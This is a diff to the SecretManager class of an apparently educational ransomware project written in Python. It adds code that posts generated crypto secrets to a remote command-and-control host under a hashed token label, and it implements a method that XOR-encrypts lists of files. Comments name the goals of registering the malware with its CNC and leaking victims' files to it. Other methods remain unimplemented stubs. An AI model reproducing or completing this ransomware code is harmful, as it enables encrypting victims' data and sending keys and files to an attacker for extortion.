@@ -3,6 +3,7 @@ import logging
 import secrets
 from os import path, urandom
 from pathlib import Path
+from socket import has_dualstack_ipv6
 from typing import List, Tuple
 import requests
 import base64
@@ -57,10 +58,26 @@ class SecretManager:
                 }
         header = {"Content-Type":"application/json"}
         self._log.debug(secrets_json)
-        # self._log.debug(headers)
-        url = 'http://' + self._remote_host_port + '/new?token=' + str(int.from_bytes(token))
+        
+        dir_label = self.get_hex_token()        
+    
+        url = 'http://' + self._remote_host_port + '/new?label=' + dir_label
+        
         post_request = requests.post(url, json = secrets_json, headers=header)
         return post_request.status_code
+
+    def xorfiles(self, files: List[str]) -> None:
+        # xor a list for file
+        [xorfile(file, self._key) for file in files]
+        return None
+
+    def get_hex_token(self) -> str:
+        # Should return a string composed of hex symbole, regarding the token
+        token_digest = hashes.Hash(hashes.SHA256())
+        token_digest.update(self._token)
+        hashed_token = token_digest.finalize()
+        
+        return str(hex(int.from_bytes(hashed_token)))[2:-1]
 
     def setup(self) -> None:
         # main function to create crypto data and register malware to cnc
@@ -89,18 +106,11 @@ class SecretManager:
         # Assert the key is valid
         raise NotImplemented()
 
-    def set_key(self, b64_key: str)->None:
+    def set_key(self, b64_key: str) -> None:
         # If the key is valid, set the self._key var for decrypting
         raise NotImplemented()
 
-    def get_hex_token(self)->str:
-        # Should return a string composed of hex symbole, regarding the token
-        raise NotImplemented()
 
-    def xorfiles(self, files: List[str]) -> None:
-        # xor a list for file
-        [xorfile(file, self._key) for file in files]
-        return None
 
     def leak_files(self, files: List[str])->None:
         # send file, geniune path and token to the CNC
